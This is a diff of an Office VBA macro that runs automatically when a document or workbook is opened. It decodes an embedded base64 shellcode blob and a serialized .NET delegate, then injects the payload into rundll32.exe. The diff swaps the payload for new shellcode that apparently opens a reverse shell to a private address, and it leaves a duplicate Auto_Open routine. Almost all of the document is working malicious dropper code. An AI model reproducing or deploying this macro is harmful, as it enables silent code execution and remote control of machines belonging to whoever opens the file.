@@ -23,38 +23,23 @@
 ' Run the payload through splitvba: python splitvba.py out.txt code.txt
 ' Copy code.txt into the section specified below.
 
-
-
-Public binary As String
-Public code As String
-
-Sub Init()
+Function Run()
     ' Replace with binary name that you want to inject into. This can be anything that exists both in SYSWOW64 and SYSTEM32
     binary = "rundll32.exe"
-
     code = ""
     
     ' Paste the output from splitvba.py below here
-    code = code & "TVroAAAAAFtSRVWJ5YHDcoAAAP/TicNXaAQAAABQ/9Bo8LWiVmgFAAAAUP/TAAAAAAAAAAAAAAAAAAAA8AAAAA4fug4AtAnNIbgB"
-    code = code & "TM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAACf0hwW27NyRduzckXbs3JFZvzkRdqz"
-    code = code & "ckXF4fZF8rNyRcXh50XIs3JFxeHxRVqzckX8dQlF1LNyRduzc0UGs3JFxeH7RWKzckXF4eBF2rNyRcXh40Xas3JFUmljaNuzckUA"
-    code = code & "AAAAAAAAAAAAAAAAAAAAUEUAAEwBBQBOViNZAAAAAAAAAADgAAKhCwEJAABCAgAA4gAAAAAAAFFvAQAAEAAAAGACAAAAABAAEAAA"
-    code = code & "AAIAAAUAAAAAAAAABQAAAAA"
-End Sub
+    code = code & "/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSL"
+    code = code & "AdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhM"
+    code = code & "dyYH/9W4kAEAACnEVFBoKYBrAP/VagVowKifiGgCABFcieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQM/04Idexo8LWi"
+    code = code & "Vv/VagBqBFZXaALZyF//1Ys2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1QHDKcZ17sMK"
 
-Private Function decodeHex(hex)
-    On Error Resume Next
-    Dim DM, EL
-    Set DM = CreateObject("Microsoft.XMLDOM")
-    Set EL = DM.createElement("tmp")
-    EL.DataType = "bin.hex"
-    EL.Text = hex
-    decodeHex = EL.NodeTypedValue
-End Function
+    ' ----
+    ' Do not modify below this line
+    ' ---- 
 
-Function Run()
     Dim serialized_obj
-        serialized_obj = "0001000000FFFFFFFF010000000000000004010000002253797374656D2E44656C656761746553657269616C697A6174696F"
+    serialized_obj = "0001000000FFFFFFFF010000000000000004010000002253797374656D2E44656C656761746553657269616C697A6174696F"
     serialized_obj = serialized_obj & "6E486F6C646572030000000844656C65676174650774617267657430076D6574686F64300303033053797374656D2E44656C"
     serialized_obj = serialized_obj & "656761746553657269616C697A6174696F6E486F6C6465722B44656C6567617465456E7472792253797374656D2E44656C65"
     serialized_obj = serialized_obj & "6761746553657269616C697A6174696F6E486F6C6465722F53797374656D2E5265666C656374696F6E2E4D656D626572496E"
@@ -260,14 +245,22 @@ Function Run()
     o.flame binary,code
 End Function
 
+Private Function decodeHex(hex)
+    On Error Resume Next
+    Dim DM, EL
+    Set DM = CreateObject("Microsoft.XMLDOM")
+    Set EL = DM.createElement("tmp")
+    EL.DataType = "bin.hex"
+    EL.Text = hex
+    decodeHex = EL.NodeTypedValue
+End Function
+
 Sub Workbook_Open()
-Init
-Run
+    Run
 End Sub
 
-Sub AutoOpen()
-Init
-Run
+Sub Auto_Open()
+    Run
 End Sub
 
 Sub Auto_Open()
